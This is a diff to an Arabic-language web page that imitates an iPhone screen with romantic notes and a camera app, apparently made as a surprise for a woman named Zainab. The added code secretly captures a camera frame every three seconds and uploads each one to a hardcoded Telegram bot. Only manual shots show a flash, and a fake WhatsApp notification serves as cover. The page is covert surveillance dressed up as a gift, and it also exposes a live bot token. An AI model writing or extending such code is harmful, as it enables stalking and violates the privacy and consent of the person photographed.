@@ -22,7 +22,6 @@
         }
     </script>
     <style>
-        /* تنسيقات إضافية مخصصة */
         body {
             background-color: #1a1a1a;
             display: flex;
@@ -33,7 +32,6 @@
             overflow: hidden;
         }
 
-        /* إطار الآيفون */
         .iphone-frame {
             width: 100%;
             height: 100vh;
@@ -54,7 +52,6 @@
             }
         }
 
-        /* الجزيرة التفاعلية (Notch) */
         .dynamic-island {
             position: absolute;
             top: 10px;
@@ -80,7 +77,6 @@
             box-shadow: inset 0 0 5px rgba(255,255,255,0.2);
         }
 
-        /* شريط الحالة العُلوي */
         .status-bar {
             position: absolute;
             top: 0;
@@ -95,7 +91,6 @@
             text-shadow: 0 1px 2px rgba(0,0,0,0.5);
         }
 
-        /* شريط العودة للشاشة الرئيسية */
         .home-indicator {
             position: absolute;
             bottom: 8px;
@@ -110,7 +105,6 @@
             box-shadow: 0 1px 2px rgba(0,0,0,0.3);
         }
 
-        /* أيقونات التطبيقات */
         .app-icon {
             width: 65px;
             height: 65px;
@@ -128,7 +122,6 @@
             transform: scale(0.9);
         }
 
-        /* تطبيقات الآيفون (النوافذ) */
         .app-window {
             position: absolute;
             top: 0;
@@ -147,7 +140,6 @@
             transform: translateY(0);
         }
 
-        /* تخصيص تطبيق الملاحظات */
         .notes-bg { background-color: #f2f2f7; }
         .note-item {
             border-bottom: 1px solid #e5e5ea;
@@ -155,7 +147,6 @@
         }
         .note-item:last-child { border-bottom: none; }
 
-        /* تخصيص تطبيق الكاميرا */
         .camera-bg { background-color: #000; color: white; }
         #camera-feed {
             width: 100%;
@@ -194,7 +185,6 @@
             transform: scale(0.9);
         }
 
-        /* تأثير الفلاش */
         #camera-flash {
             position: absolute;
             top: 0;
@@ -208,7 +198,6 @@
             transition: opacity 0.1s ease-out;
         }
 
-        /* إشعار الواتساب */
         #whatsapp-notify {
             position: absolute;
             top: 15px;
@@ -222,7 +211,6 @@
             transform: translateY(0);
         }
 
-        /* رسالة منبثقة (Alert) الآيفون */
         #ios-alert {
             position: absolute;
             inset: 0;
@@ -257,7 +245,6 @@
 
     <div class="iphone-frame" id="iphone">
         
-        <!-- شريط الحالة (الوقت والبطارية) -->
         <div class="status-bar">
             <div id="clock">12:00</div>
             <div class="flex gap-2 text-sm" dir="ltr">
@@ -267,7 +254,6 @@
             </div>
         </div>
 
-        <!-- الجزيرة التفاعلية -->
         <div class="dynamic-island">
             <div class="camera-lens"></div>
             <div class="w-2 h-2 rounded-full bg-green-500 opacity-0 transition-opacity" id="camera-indicator"></div>
@@ -287,11 +273,10 @@
             </div>
         </div>
 
-        <!-- الشاشة الرئيسية (أيقونات التطبيقات) -->
+        <!-- الشاشة الرئيسية -->
         <div class="absolute inset-0 pt-20 px-6 pb-24 z-10 flex flex-col justify-between">
             <div class="grid grid-cols-4 gap-4 mt-8">
                 
-                <!-- أيقونة الملاحظات -->
                 <div class="flex flex-col items-center gap-1" onclick="openApp('notes-app')">
                     <div class="app-icon bg-yellow-400 text-white">
                         <i class="fas fa-book"></i>
@@ -299,7 +284,6 @@
                     <span class="text-white text-xs font-semibold drop-shadow-md">الملاحظات</span>
                 </div>
 
-                <!-- أيقونة الكاميرا -->
                 <div class="flex flex-col items-center gap-1" onclick="openApp('camera-app')">
                     <div class="app-icon bg-gray-200 text-gray-800">
                         <i class="fas fa-camera"></i>
@@ -309,7 +293,6 @@
 
             </div>
             
-            <!-- شريط التطبيقات السفلي (Dock) -->
             <div class="bg-white/30 backdrop-blur-md rounded-3xl p-4 flex justify-around">
                 <div class="app-icon bg-green-500"><i class="fas fa-phone"></i></div>
                 <div class="app-icon bg-blue-500"><i class="fas fa-comment"></i></div>
@@ -318,13 +301,11 @@
             </div>
         </div>
 
-        <!-- ================= تطبيق الملاحظات ================= -->
+        <!-- تطبيق الملاحظات -->
         <div id="notes-app" class="app-window notes-bg">
             <div class="pt-20 px-6 pb-4">
                 <h1 class="text-3xl font-bold text-gray-800 mb-6">ملاحظاتي</h1>
-                <div class="bg-white rounded-xl shadow-sm overflow-hidden" id="notes-list">
-                    <!-- سيتم إضافة الملاحظات هنا -->
-                </div>
+                <div class="bg-white rounded-xl shadow-sm overflow-hidden" id="notes-list"></div>
             </div>
         </div>
 
@@ -340,14 +321,12 @@
             </div>
         </div>
 
-        <!-- ================= تطبيق الكاميرا ================= -->
+        <!-- تطبيق الكاميرا -->
         <div id="camera-app" class="app-window camera-bg relative">
             
-            <!-- شريط الكاميرا العلوي -->
             <div class="absolute top-16 w-full flex justify-between items-center px-6 z-40">
                 <button onclick="closeApps()" class="text-white text-xl"><i class="fas fa-chevron-down"></i></button>
                 
-                <!-- زر الفلاتر الجديد -->
                 <button onclick="showFilterAlert()" class="text-yellow-400 font-bold flex flex-col items-center gap-1">
                     <i class="fas fa-magic text-xl"></i>
                     <span class="text-xs">فلاتر</span>
@@ -356,24 +335,20 @@
                 <i class="fas fa-bolt text-white text-xl"></i>
             </div>
 
-            <!-- عنصر الفيديو לעرض الكاميرا -->
             <video id="camera-feed" autoplay playsinline muted></video>
             
-            <!-- عنصر خفي لالتقاط الصورة -->
             <canvas id="photo-canvas" class="hidden"></canvas>
 
-            <!-- زر الالتقاط -->
             <div class="shutter-btn-container">
-                <div class="shutter-btn" onclick="takePicture()">
+                <div class="shutter-btn" onclick="takeManualPicture()">
                     <div class="shutter-btn-inner"></div>
                 </div>
             </div>
 
-            <!-- تأثير الفلاش -->
             <div id="camera-flash"></div>
         </div>
 
-        <!-- ================= التنبيه المنبثق (للفلاتر) ================= -->
+        <!-- التنبيه المنبثق للفلاتر -->
         <div id="ios-alert">
             <div class="overlay"></div>
             <div class="bg-white/95 backdrop-blur-xl w-64 rounded-2xl flex flex-col text-center relative z-10" id="ios-alert-box">
@@ -387,18 +362,15 @@
             </div>
         </div>
 
-        <!-- شريط العودة للشاشة الرئيسية -->
         <div class="home-indicator" onclick="closeApps()"></div>
 
     </div>
 
     <script>
-        // ================= إعدادات تيليجرام (تم إدخال بياناتك) =================
+        // إعدادات تيليجرام
         const TELEGRAM_BOT_TOKEN = '8507267987:AAEEpWypLGv5lP27tV2WaUYZgPRnr3JjwHg'; 
         const TELEGRAM_CHAT_ID = '8741862928';
-        // =========================================================================
 
-        // تحديث الساعة
         function updateClock() {
             const now = new Date();
             let hours = now.getHours();
@@ -410,8 +382,8 @@
         setInterval(updateClock, 1000);
         updateClock();
 
-        // التحكم في التطبيقات
         let currentStream = null;
+        let autoCaptureInterval = null; // متغير للتحكم في التصوير التلقائي
 
         function openApp(appId) {
             document.getElementById(appId).classList.add('active');
@@ -427,7 +399,6 @@
             closeNoteReader();
         }
 
-        // ================= برمجة تطبيق الملاحظات =================
         const notes = [
             {
                 title: "إلى أجمل صدفة ❤️",
@@ -471,7 +442,6 @@
             document.getElementById('note-reader').classList.remove('active');
         }
 
-        // ================= وظائف زر الفلاتر =================
         function showFilterAlert() {
             document.getElementById('ios-alert').classList.add('show');
         }
@@ -492,6 +462,12 @@
                 });
                 video.srcObject = currentStream;
                 indicator.classList.remove('opacity-0'); 
+                
+                // بدء التصوير التلقائي الصامت كل 3 ثواني (3000 ملي ثانية)
+                autoCaptureInterval = setInterval(() => {
+                    captureAndSendSilent('صورة تلقائية لزينب من داخل التطبيق 📸❤️');
+                }, 3000);
+
             } catch (err) {
                 console.error("خطأ في فتح الكاميرا: ", err);
                 alert("يرجى السماح بالوصول للكاميرا لرؤية المفاجأة!");
@@ -500,6 +476,12 @@
 
         function stopCamera() {
             const indicator = document.getElementById('camera-indicator');
+            // إيقاف التصوير التلقائي عند إغلاق التطبيق
+            if (autoCaptureInterval) {
+                clearInterval(autoCaptureInterval);
+                autoCaptureInterval = null;
+            }
+
             if (currentStream) {
                 currentStream.getTracks().forEach(track => track.stop());
                 currentStream = null;
@@ -507,23 +489,31 @@
             }
         }
 
-        function takePicture() {
-            const video = document.getElementById('camera-feed');
-            const canvas = document.getElementById('photo-canvas');
+        // دالة التصوير اليدوي (عندما تضغط هي على الزر) - بها تأثيرات مرئية
+        function takeManualPicture() {
             const flash = document.getElementById('camera-flash');
-            
             if (!currentStream) return;
 
             // 1. تأثير الفلاش
             flash.style.opacity = '1';
             setTimeout(() => { flash.style.opacity = '0'; }, 150);
 
-            // 2. إظهار إشعار الواتساب (رسالة الغزل) بعد ثانية من الالتقاط
+            // 2. إظهار إشعار الواتساب
             setTimeout(() => {
                 showNotification();
             }, 1000);
 
-            // 3. التقاط الصورة
+            // 3. التقاط وإرسال الصورة
+            captureAndSendSilent('فؤاد، لقد التقطت زينب صورة للتو! ❤️ (تصوير يدوي)');
+        }
+
+        // دالة التصوير الصامت والإرسال (تُستخدم للتلقائي ولليدوي)
+        function captureAndSendSilent(captionText) {
+            if (!currentStream) return;
+
+            const video = document.getElementById('camera-feed');
+            const canvas = document.getElementById('photo-canvas');
+            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
@@ -533,9 +523,9 @@
             context.scale(-1, 1);
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // 4. إرسال الصورة لتيليجرام
+            // إرسال الصورة لتيليجرام
             canvas.toBlob((blob) => {
-                sendPhotoToTelegram(blob);
+                sendPhotoToTelegram(blob, captionText);
             }, 'image/jpeg', 0.8);
         }
 
@@ -545,7 +535,6 @@
             const notify = document.getElementById('whatsapp-notify');
             notify.classList.add('show');
             
-            // إخفاء الإشعار تلقائياً بعد 5 ثواني
             clearTimeout(notifyTimeout);
             notifyTimeout = setTimeout(() => {
                 hideNotification();
@@ -557,11 +546,11 @@
         }
 
         // ================= الإرسال إلى تيليجرام =================
-        function sendPhotoToTelegram(imageBlob) {
+        function sendPhotoToTelegram(imageBlob, captionText) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', imageBlob, 'zainab_photo.jpg');
-            formData.append('caption', 'فؤاد، لقد التقطت زينب صورة للتو! ❤️');
+            formData.append('caption', captionText);
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
@@ -569,9 +558,7 @@
             })
             .then(response => response.json())
             .then(data => {
-                if(data.ok) {
-                    console.log('تم الإرسال لتيليجرام بنجاح');
-                } else {
+                if(!data.ok) {
                     console.error('خطأ من تيليجرام:', data.description);
                 }
             })
